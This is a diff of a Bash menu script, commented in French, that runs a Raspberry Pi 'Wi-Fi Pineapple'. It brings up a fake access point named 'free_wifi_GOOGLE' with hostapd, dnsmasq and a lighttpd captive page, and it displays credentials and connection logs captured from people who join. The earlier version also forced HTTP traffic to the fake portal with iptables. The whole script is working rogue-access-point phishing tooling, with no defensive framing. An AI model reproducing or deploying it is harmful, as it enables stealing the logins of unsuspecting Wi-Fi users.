@@ -1,89 +1,87 @@
 #!/bin/bash
 
-WLAN_FAKEAP="wlan1"
-GATEWAY="10.0.0.1"
 DIR="/home/pi/pineapple"
-CAPTURE_FILE="$DIR/captures/creds.txt"
+CAPTURES="$DIR/captures"
+DNSMASQ_CONF="$DIR/dnsmasq.conf"
+HOSTAPD_CONF="$DIR/hostapd.conf"
+INTERFACE="wlan1"
 
-start_pineapple() {
-    echo "[*] Démarrage du fake AP sur $WLAN_FAKEAP..."
-    sudo ip link set "$WLAN_FAKEAP" down
-    sudo iw dev "$WLAN_FAKEAP" set type __ap
-    sudo ip addr flush dev "$WLAN_FAKEAP"
-    sudo ip addr add "$GATEWAY/24" dev "$WLAN_FAKEAP"
-    sudo ip link set "$WLAN_FAKEAP" up
+start_ap() {
+  echo "[*] Configuration de l'interface $INTERFACE..."
+  sudo ip link set $INTERFACE down
+  sudo ip addr flush dev $INTERFACE
+  sudo ip addr add 10.0.0.1/24 dev $INTERFACE
+  sudo ip link set $INTERFACE up
 
-    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
-    sudo iptables -F
-    sudo iptables -t nat -F
-    sudo iptables -t nat -A PREROUTING -i "$WLAN_FAKEAP" -p tcp --dport 80 -j DNAT --to "$GATEWAY":80
-    sudo iptables -t nat -A POSTROUTING -j MASQUERADE
+  echo "[*] Démarrage du serveur web..."
+  sudo cp -r "$DIR/www"/* /var/www/html/
+  sudo systemctl restart lighttpd
 
-    echo "[*] Nettoyage et déploiement des fichiers web..."
-    sudo rm -rf /var/www/html/*
-    sudo cp -r "$DIR/www/"* /var/www/html/
-    sudo systemctl restart lighttpd
+  echo "[*] Lancement de hostapd et dnsmasq..."
+  sudo hostapd "$HOSTAPD_CONF" -B
+  sudo dnsmasq -C "$DNSMASQ_CONF"
 
-    sudo dnsmasq -C "$DIR/dnsmasq.conf"
-    sudo hostapd "$DIR/hostapd.conf" &
-
-    echo "[✔] Pineapple lancé. SSID : Free_wifi"
-    read -p "Appuie sur Entrée pour revenir au menu..."
+  echo "[✔] Point d'accès lancé : SSID 'free_wifi_GOOGLE'"
 }
 
-stop_pineapple() {
-    echo "[*] Arrêt du Pineapple..."
-    sudo killall hostapd dnsmasq 2>/dev/null
-    sudo iptables -F
-    sudo iptables -t nat -F
-    sudo ip addr flush dev "$WLAN_FAKEAP"
-    sudo ip link set "$WLAN_FAKEAP" down
-    sudo iw dev "$WLAN_FAKEAP" set type managed
-    sudo ip link set "$WLAN_FAKEAP" up
-    echo "[✔] Pineapple arrêté."
-    read -p "Appuie sur Entrée pour revenir au menu..."
+stop_ap() {
+  echo "[*] Arrêt de hostapd, dnsmasq et réinitialisation réseau..."
+  sudo pkill hostapd
+  sudo pkill dnsmasq
+  sudo ip link set $INTERFACE down
+  sudo ip addr flush dev $INTERFACE
+  sudo ip link set $INTERFACE up
+  echo "[✔] Point d'accès arrêté."
 }
 
 show_creds() {
-    echo -e "\n[📄] Identifiants capturés :"
-    if [[ -f "$CAPTURE_FILE" ]]; then
-        cat "$CAPTURE_FILE"
-    else
-        echo "Aucun identifiant trouvé."
-    fi
-    echo
-    read -p "Appuie sur Entrée pour revenir au menu..."
+  echo -e "\n--- Identifiants capturés ---"
+  if [[ -f "$CAPTURES/creds.txt" ]]; then
+    cat "$CAPTURES/creds.txt"
+  else
+    echo "(Aucun identifiant capturé)"
+  fi
+  echo "------------------------------"
+  read -rp "Appuie sur Entrée pour continuer..."
 }
 
-clear_creds() {
-    if [[ -f "$CAPTURE_FILE" ]]; then
-        > "$CAPTURE_FILE"
-        echo "[✔] Identifiants effacés."
-    else
-        echo "Aucun fichier à vider."
-    fi
-    read -p "Appuie sur Entrée pour revenir au menu..."
+show_logs() {
+  echo -e "\n--- Journal des connexions ---"
+  if [[ -f "$CAPTURES/visits.log" ]]; then
+    cat "$CAPTURES/visits.log"
+  else
+    echo "(Aucune connexion enregistrée)"
+  fi
+  echo "------------------------------"
+  read -rp "Appuie sur Entrée pour continuer..."
+}
+
+clean_data() {
+  echo "[*] Suppression des logs..."
+  rm -f "$CAPTURES/creds.txt" "$CAPTURES/visits.log"
+  echo "[✔] Logs supprimés."
+  read -rp "Appuie sur Entrée pour continuer..."
 }
 
 while true; do
-    clear
-    echo "============================="
-    echo "   🍍 MENU PINEAPPLE RPi"
-    echo "============================="
-    echo "1. Démarrer le Pineapple"
-    echo "2. Arrêter le Pineapple"
-    echo "3. Voir les identifiants capturés"
-    echo "4. Vider les identifiants"
-    echo "5. Quitter"
-    echo "-----------------------------"
-    read -p "Choix [1-5] : " choice
+  clear
+  echo "=== MENU Wi-Fi Pineapple ==="
+  echo "1. Démarrer le faux point d'accès"
+  echo "2. Arrêter le faux point d'accès"
+  echo "3. Afficher les identifiants capturés"
+  echo "4. Afficher les connexions/logs"
+  echo "5. Supprimer les logs"
+  echo "0. Quitter"
+  echo "============================="
+  read -rp "Choix : " CHOICE
 
-    case "$choice" in
-        1) start_pineapple ;;
-        2) stop_pineapple ;;
-        3) show_creds ;;
-        4) clear_creds ;;
-        5) echo "À bientôt !"; exit 0 ;;
-        *) echo "Option invalide."; sleep 1 ;;
-    esac
+  case $CHOICE in
+    1) start_ap ;;
+    2) stop_ap ;;
+    3) show_creds ;;
+    4) show_logs ;;
+    5) clean_data ;;
+    0) echo "Bye !"; exit ;;
+    *) echo "Choix invalide. Appuie sur Entrée pour réessayer." ; read ;;
+  esac
 done
